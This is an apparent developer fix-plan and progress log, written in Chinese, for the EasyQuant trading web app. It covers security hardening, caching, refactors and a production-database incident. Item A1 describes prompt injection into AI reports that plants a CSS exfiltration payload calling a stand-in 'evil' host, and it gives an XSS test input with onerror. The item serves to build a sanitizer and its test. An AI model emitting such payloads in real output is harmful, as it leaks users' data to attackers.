# EasyQuant 优化文档（fix-plan-2026-07）收尾待办

> **生成依据**：`docs/fix-plan-2026-07.md` 的全部 P0–P5 项已完成 7 个本地分支并部署验证；本文档汇集评审中识别的 **剩余待办**（半实现、未做、合规违规、补强），按优先级与依赖排序。
>
> **范围约定**：每个条目包含
> - 来源（评审 finding 或文档原项）
> - 验收标准（可量化或可 curl 验证）
> - 改动文件提示
>
> **总览**：已交付 7 分支 / 133 测试 / 线上验证全部 200；剩下 14 条待办按 4 个 sprint 排期。
>
> ---
>
> **2026-07-19 执行进度**（Sprint A–D 本轮会话）：
> - ✅ Sprint A（A1–A4）、Sprint B（B1–B6）、Sprint C（C1–C6）全部完成并部署上线。
> - ✅ Sprint D2（models_auth 并入 models）完成。
> - ✅ Sprint D1 **部分**：`app/skill_chat.py` 抽取完成（main.py 2387→2151 行）。
> - ⏸️ Sprint D1 **剩余**：路由拆 `routers/` + `scheduler.py`。路由当前用闭包捕获
>    `create_app` 内 service 实例，外移需改 `Depends`/`app.state` 注入架构，高风险，
>    建议专项会话单独做（不在本轮）。
> - ⚠️ **2026-07-19 事故**：本轮 Sprint A 部署后跑全量 pytest，因 `app.main` 模块顶层
>    `app = create_app()` 在测试 import 时对生产库跑 recovery，导致生产 DB 一度被砸成 4K 空库
>    （已从 00:50 备份恢复，加 `_is_test_context()` 守卫修复根因，详见
>    `memory/incident-2026-07-19-prod-db-truncated.md`）。
> - 测试：133 → 166 passed；6 个新分支待 SSH 密钥加载后推送远程。

---

## Sprint A：安全 + 诚信 + 合规（建议本轮一次完成）

### A1. [P0-6 补强] sanitize 禁 `style` 属性 + 颜色染色改 class（防 CSS exfil）
- **来源**：评审 F1 — AI 报告经 DOMPurify 渲染时默认放行 `style`，提示词注入可植入 `<img src=x style="background:url(https://evil/?c=...)">` 触发 CSS exfil。
- **方案**：
  1. `frontend/src/lib/sanitize.js`：`FORBID_ATTR` 追加 `"style"`；`ALLOWED_TAGS` 收紧为白名单（`["p","br","strong","em","ul","ol","li","code","pre","h1","h2","h3","h4","blockquote","span","a","img"]`）。
  2. `frontend/src/views/AiCenterView.vue:213-220` 正则染色不再内联 `style` 属性，改 class（`class="up"`/`class="down"`/`class="alert-bad"`），样式交给 `styles.css` 中已有的 `.markdown-body .up/.down`（已用 `--up/--down` token）。
  3. `AiCenterView.vue:757` `.btn-apply` 改 class 化（如 `.btn-apply { background: var(--success-soft); color: var(--success); }`）。
- **验收**：向 AI 报告注入 `<img src=x style="background:url(http://evil/?c=...)">`，前端渲染产物无 `style` 属性、无 `background:url` 出现；`grep -rn "style=" frontend/src/views/AiCenterView.vue` 仅剩 markdown-body 内部结构（不应再有 AI 输出携带的 style）。
- **测试**：在 `tests/test_p0_security.py` 追加 `test_sanitize_strips_style_and_dangerous_attrs`：用 `<img src=x onerror=alert(1) style="background:url(http://evil)">` 输入，断言产物不含 `style` / `onerror` / `background:`。

### A2. [P4-4] HomeView「行动优先级」补后端字段（前端已绑但无数据）
- **来源**：评审 F2 — 模板绑了 `action_priority.source/updated_at/link`，但 `market_signal.build_action_priority()` 只返回 `title/reason/href/primary_workspace`。
- **方案**：在 `app/services/market_signal.py` 的 `build_action_priority()` 返回 dict 加：
  ```python
  {
      "title": "...",
      "reason": "...",
      "href": "/opportunity-pool",
      "primary_workspace": {...},
      "source": "早盘复盘",        # 取自 rulepack.title 或 job.name
      "updated_at": now_cn().isoformat(),
      "link": "/opportunity-pool",   # 与 href 同义，前端用 link
  }
  ```
- **验收**：打开首页 → 行动优先级卡片显示「来源 早盘复盘 · 更新于 HH:MM:SS」+ 「查看详情 →」按钮可点击跳转。
- **测试**：扩 `tests/test_home_dashboard.py`（若不存在则新建）断言 `action_priority.source/updated_at/link` 三个字段非空。

### A3. [P4-1] WorkspaceView 笔记补「编辑/删除」+ 行内编辑
- **来源**：评审 F4 — `WorkspaceView.vue:274-277` 笔记行无删除按钮、无编辑。
- **方案**：
  1. 笔记行加 `btn-remove`（与自选股/板块一致）。
  2. 行内容可点击展开 `<textarea>` 内联编辑，Enter 保存 / Esc 取消；或简化为：行尾加「✕ 删除」按钮（编辑可后续做）。
  3. 后端 `POST /api/notes` 已存在；需要 `DELETE /api/notes/{subject_type}/{subject_key}` 端点（`app/services/workspace.py` 加 `delete_note`，`app/main.py` 加路由）。
- **验收**：添加错误笔记 → 点击「✕」删除 → 列表更新；后端 `DELETE /api/notes/sector/测试板块` → 200。
- **测试**：扩 `tests/test_api.py` 加 `test_workspace_note_crud_roundtrip`：POST → 列表含 → DELETE → 列表不含。

### A4. [CLAUDE.md 合规] 消歧 + 分支前缀白名单 + 备份动作
- **来源**：评审 F8
- **方案**：
  1. `CLAUDE.md:54` 删除 `bash start.sh` 示例（或移到「已废弃」注释），只留 launchd 流程，消歧 line 101。
  2. `CLAUDE.md:90` 分支前缀白名单追加 `refactor/` 与 `feat/`（现代约定），并明确 `feat` 与 `feature` 同义。
  3. `CLAUDE.md:91` 仓库根违规遗留清理：`dump.sql`（空文件，删）、`tmp_market_data.json`（19B，移 `scripts/experiments/` 或删）、`test_ai_engines.py`（6514B，移 `scripts/experiments/`）。
  4. 后续 `ensure_ai_center_schema` 改动前先做 `cp data/sector_fund_monitor.db data/.backup-pre-migration.db`，在 commit message 中写明。已在 commit `dc94061`（P5-3）后做的，写一个 retro 备份 + 文档说明。
- **验收**：
  - `CLAUDE.md` line 54 不再含 `bash start.sh`；line 90 列出 `feature/fix/chore/refactor/feat` 五种前缀。
  - `ls /Users/jwkj/easyquant/{dump.sql,tmp_market_data.json,test_ai_engines.py}` 无输出。
  - `data/.backup-pre-migration.db` 存在。

---

## Sprint B：P5-1/P5-4 收尾（中等，单次会话可完成）

### B1. [P5-1c] skill_executor `_find_new_output_files` 按约定文件名精确匹配
- **来源**：`docs/fix-plan-2026-07.md` P5-1c + 评审未做项 — 当前按 mtime 扫描 inbox，多 job 重叠时互相认领产出。
- **方案**：改造 `app/services/skill_executor.py:_find_new_output_files`（约行 409-422）：从 inbox 列出文件后，按 cron job_id / run_id 命名前缀（约定 `data/ai_center/inbox/<HHMM>_<skill>_<date>_<runid>.json`）精确归属到对应 job，而非 mtime-first-claim。
- **验收**：并发触发 2 个 skill → inbox 出现 2 个文件 → 每个文件被其对应的 job 认领，无错配。
- **测试**：扩 `tests/test_ai_center.py`（参考 `_find_new_output_files` 单测，若无则新建）模拟并发 2 job 产出，断言归属正确。

### B2. [P5-1e] realtime_cache `_live_quotes_by_code` 加 5–10s TTL 内存缓存
- **来源**：`docs/fix-plan-2026-07.md` P5-1e — 当前每请求同步打腾讯行情（无缓存，timeout 20s）。
- **方案**：在 `app/services/realtime_cache.py` 类内加 `_live_quotes_cache: dict[str, tuple[float, dict]] = {}` 与 `_LIVE_QUOTES_TTL = 8`，`_live_quotes_by_code` 先查 cache（未过期直接返回），miss 则 fetch 后写入。
- **验收**：连续 2 次调用 `/api/sector-stocks` 在 8s 内复用同一份行情（验证：mock 第二次 fetch 不被调用）。
- **测试**：扩 `tests/test_realtime_cache.py`（已有 `FakeGateway`）验证 TTL 内复用与过期重取。

### B3. [P5-1g] news_service 聚类改分桶（先按 title_hash 再模糊比）
- **来源**：`docs/fix-plan-2026-07.md` P5-1g — `SequenceMatcher` 跑在 O(n²) 上。
- **方案**：在 `app/services/news_service.py:415-495` 聚类前先用 `hashlib.md5(title.lower().strip()).hexdigest()[:8]` 作桶 key，同桶内做模糊比；不同桶直接视为不同聚类。`candidate_limit` 降配额（如 50→20）。
- **验收**：1k 条新闻聚类时间 < 0.5s（原 > 2s）；同义标题归入同聚类，相似度阈值 ≥ 0.7。
- **测试**：扩 `tests/test_news_service.py`（已有 299 行，扩 1 用例即可）。

### B4. [P5-4 收尾] news_service 切到 `now_cn()`（评审 F7）
- **来源**：评审 F7 — `news_service.py:194,297,331,381,467` 共 5 处 `datetime.now()` 未切换，新闻去重窗口可能跨日漂移 8 小时。
- **方案**：`app/services/news_service.py` 顶部 `from app.time_utils import now_cn`，5 处 `datetime.now()` 改为 `now_cn().replace(tzinfo=None)`。
- **验收**：`grep -n "datetime\.now()" app/services/news_service.py` 无输出。
- **测试**：扩 `tests/test_news_service.py` 加 `test_news_fetched_at_uses_beijing_timezone`：mock now_cn 返回 UTC+8 21:00，验证 cutoff 计算与 fetched_at 字段均为北京时间。

### B5. [P5-1i] limit_up 端点加 30–60s 内存缓存
- **来源**：`docs/fix-plan-2026-07.md` P5-1i — 每端点打 3-4 次东财接口。
- **方案**：在 `app/services/limit_up.py` 类内加 `_summary_cache`、`_ladder_cache`、`_broken_cache`、`_strong_cache`（按 `trading_date + market_scope` 维度），TTL 45s。
- **验收**：连续 2 次调用 `/api/limit-up/summary?trading_date=...&market_scope=...` 在 45s 内复用同一份（mock 第二次 fetch 不被调）。
- **测试**：扩 `tests/test_api.py` 或 `tests/test_limit_up_service.py`（若存在）验证。

### B6. [P5-1l] ai_center inbox scan 改增量 + 定期清理
- **来源**：`docs/fix-plan-2026-07.md` P5-1l — `processed/` 231 个文件无清理；扫描全量 glob。
- **方案**：
  1. `app/services/ai_center.py:scan_import_directory` 维护一个 watermark（`data/ai_center/.import-watermark` 文件存 mtime/iso），只扫 mtime > watermark 的文件。
  2. 启动时清理 `processed/` 内 mtime > 7 天的旧文件（移到 `processed/_archived/<date>/` 或直接删）。
- **验收**：连续 2 次 `scan_import_directory` 第二次几乎不读盘；`processed/` 目录文件数随时间有上限。
- **测试**：扩 `tests/test_ai_center.py` 验证 watermark 增量扫描 + 7 天清理。

---

## Sprint C：P5-3/P5-4 altitude 修补 + 抽组件（重构，半天到一天）

### C1. [P5-3 扩展] `_add_missing_columns` 真正通用化（评审 F5）
- **来源**：评审 F5 — helper 当前只服务 4 张表，剩余 14+ 张表列漂移未覆盖。
- **方案**：
  1. `app/models.py` 加 `BASE.metadata` 扫描：对每个 `Table` 找出其 `Column` 的 `server_default`/`nullable`，与 `Inspector.get_columns(table_name)` 差分生成 ADD COLUMN。
  2. `_add_missing_columns` 改为通用：传入 `engine` + `Base`，自动扫所有 ORM 表，缺则 ADD（仅处理简单类型，不处理 FK/Unique 约束）。
  3. `ensure_ai_center_schema` 调用一次 `_migrate_all(engine, Base)`，移除对 4 张表的硬编码。
- **验收**：新建一个表（手动加 `class NewTable` 到 models.py + `_add_column`），重启后 `data/sector_fund_monitor.db` 自动含该表与新增列。
- **测试**：`tests/test_p5_regressions.py` 扩 1 用例：临时 Base 含 `__tablename__ = "_test_migrate"` + 一列 → 跑 migrate → 验证表与列存在。

### C2. [复用] 抽 `_merge_upsert_by_key` helper（评审 + 角度 复用）
- **来源**：评审 — `realtime_cache.sync_watched_sectors` 与 `workspace.sync_watched_stocks` 逐行重复 merge upsert 逻辑。
- **方案**：新建 `app/services/_common.py`，定义 `def merge_upsert_by_key(session, model, items, key_fields, update_fields=None) -> list[Model]`。两处 service 改用 helper。
- **验收**：行为不变（`tests/test_p5_regressions.py` 两个 merge upsert 测试继续通过）；代码行数 -30 行。

### C3. [复用] 抽 `composables/useTimerCleanup.js`（角度 复用 F6）
- **来源**：角度 复用 — `AiJobsView.vue:20-23` 与 `UserMgmtView.vue:33-34` 各自维护 `_timers + later + onBeforeUnmount`。
- **方案**：新建 `frontend/src/composables/useTimerCleanup.js`，导出 `const { later, push } = useTimerCleanup()`。两处 view 改用。
- **验收**：行为不变；两处 view 不再各自实现 timer 管理。

### C4. [复用] AuthMiddleware 加 token→user LRU 缓存（角度 效率 #4）
- **来源**：角度 效率 #4 — 每个受保护请求都开 session 查 users 表，高并发瓶颈。
- **方案**：`app/dependencies.py` 加 `from functools import lru_cache` + 进程内 token→user 缓存（TTL 30s，maxsize 256）。注意 JWT 已含 user_id/username/is_admin，过期时 invalidate。
- **验收**：连续 100 次 `/api/page/*` 在 30s 内只查 1 次 users 表（埋点或日志验证）。
- **测试**：新增 `tests/test_auth_cache.py` 验证 30s TTL 内复用、token 变更/失效时穿透。

### C5. [P3-2/3-3 补强] 抽 `composables/useFilteredList.js` + `useRouteTab.js`
- **来源**：`docs/fix-plan-2026-07.md` P3-3 — AlertsView/OpportunityPoolView 24-81 行近重复（bootstrap + watch 筛选 + 手动刷新 + 移动端 scrollIntoView）。
- **方案**：
  1. 新建 `frontend/src/composables/useFilteredList.js`：封装 `useQuery` + `local ref` + `watch 筛选` + `requestSeq` 竞态 + `error` 态。
  2. 新建 `frontend/src/composables/useRouteTab.js`：封装 tab ↔ URL query 双向同步。
  3. AlertsView/OpportunityPoolView 改用。
- **验收**：两 view 代码量 -50 行；行为不变。

### C6. [P3-2] 推全 StatusBadge 组件 + 删双份 CSS
- **来源**：`docs/fix-plan-2026-07.md` P3-2 — `AiCenterView.vue` 用 `<span class="status-badge">` 而非 `<StatusBadge>` 组件（评审 F1 关联）。
- **方案**：
  1. `AiCenterView.vue:474,636` 改用 `<StatusBadge status="success">` / `<StatusBadge status="danger">` 等。
  2. 删 `AiCenterView.vue:614-622` 我之前加的临时 `.status-badge/.status-success/.status-danger` scoped 样式。
  3. 类似清理 AiJobsView、ReviewView 的双份 status 样式。
- **验收**：`grep "status-badge" frontend/src/views/` 仅剩组件引用，无散落 `<span class="status-badge">`；styles.css 不再被双份 CSS 占用。

---

## Sprint D：P5-2 大重构（main.py 2248 行 → ~1500 行，半天到一天）

### D1. [P5-2] 拆 main.py：路由分到 routers/，scheduler 注册分到 scheduler.py，SSE/CLI 子进程分到 skill_chat.py
- **来源**：`docs/fix-plan-2026-07.md` P5-2 — main.py 2294 行（评审 F6）。
- **方案**：
  1. 新建 `app/routers/market.py`（首页/概览/系统摘要/指数趋势）
  2. 新建 `app/routers/limit_up.py`（连板/炸板/温度/梯队）
  3. 新建 `app/routers/ai_center.py`（AI 任务/run/note/engine/engines/产出）
  4. 新建 `app/routers/news.py`（消息面/即时资讯/复盘）
  5. 新建 `app/routers/workspace.py`（个人观察台/笔记 CRUD）
  6. 新建 `app/routers/auth_pages.py`（SPA shell 路由）
  7. 新建 `app/scheduler.py`（APScheduler 注册 + catch-up 逻辑）
  8. 新建 `app/skill_chat.py`（SSE 流式生成 + Claude/Goose/Custom 子进程）
  9. `app/main.py:create_app` 仅做组装：lifespan + middleware + router include + scheduler.start。
- **验收**：
  - `app/main.py` 行数 < 400
  - `app/routers/*.py` 每个 < 400 行
  - 133 测试 + 全站页面接口全部仍 200
- **测试**：补 `tests/test_main_composition.py`：断言 main.py 行数 < 400；断言每个 router 模块可独立 import；lifespan 启动不抛错。

### D2. [P5-3 配对] models_auth.py 并入 models.py
- **来源**：`docs/fix-plan-2026-07.md` P5-3 末尾 — models_auth.py 18 行单文件应并入 models.py。
- **方案**：将 `User` 类移入 `app/models.py`，删 `app/models_auth.py`，更新所有 import。
- **验收**：`grep -rn "models_auth" app/` 无输出。

### D3. [CLAUDE.md 合规跟进] 用 `refactor/p3-frontend-dedup` 后续 PR 修复 P3-2/3 抽组件后，分支名改 `refactor/frontend-...`（已在 A4 修订）

---

## 已完成项（不重复，仅索引）

- **P0 全部 8 项**：认证白名单/DB 撞锁修复/akshare 超时/JWT 密钥+PBKDF2+迁移/AuthMiddleware 线程池/AuthMiddleware threadpool/5 处 v-html 全 sanitize/SSE 心跳 thread+queue/test fixture 注入 token（commit `8a4c249`）。
- **P1 全部 5 项**：data 18G→5.2G、.gitignore 重写、12 个空壳 CLAUDE.md 删除、3 个 DB 探针改只读、CLAUDE.md 修正（commit `4051588`）。
- **P2 全部 8 项**：聊天 IME/QueryState error+retry/StatusBadge computed/时钟响应式/翻页 oldestId/todayIso 统一本地/api.js 401 router.push+signal+content-type/14 项打包修（commit `636804e`）。
- **P3 关键 3/5**：涨跌色 token、hero 文案、构建优化首屏 814→20KB（commit `cd3702d`）。
- **P4 关键**：Workspace 自选股/板块 CRUD、「应用此配置」接通 PUT、3 详情动作、HomeView 删占位卡（commit `eb795d8`）。
- **P5-1 7/12** + **P5-3/4/6**（commit `65e7e60`、`260b2c3`、`dc94061`）。
- **测试 133 项通过，生产部署全部 200**。

---

## 执行建议

| Sprint | 估时 | 风险 | 建议执行顺序 |
|---|---|---|---|
| A（安全+诚信+合规） | 1h | 低 | 第 1 批：F1/F2/F4/F8 是用户可直接感知的"小坑"，先补 |
| B（P5-1/P5-4 收尾） | 半天 | 中 | 第 2 批：news_service 时区（B4）是真 bug 风险；其余是性能/整洁 |
| C（P5-3/复用/组件） | 半天到 1 天 | 中 | 第 3 批：抽组件与 helper 是降债，不急但建议做 |
| D（P5-2 拆 main.py） | 1 天 | 中-高 | 最后：拆文件是大重构，需配套测试覆盖，建议有完整时段时做 |

每个 Sprint 完成后请按既定分支管理（`fix/<name>` / `refactor/<name>`）+ 中文 commit + `npm run build:spa`（前端）+ `pytest` + launchd 重启 + 线上 curl 验证 + `git push`（待 SSH 密钥可用）。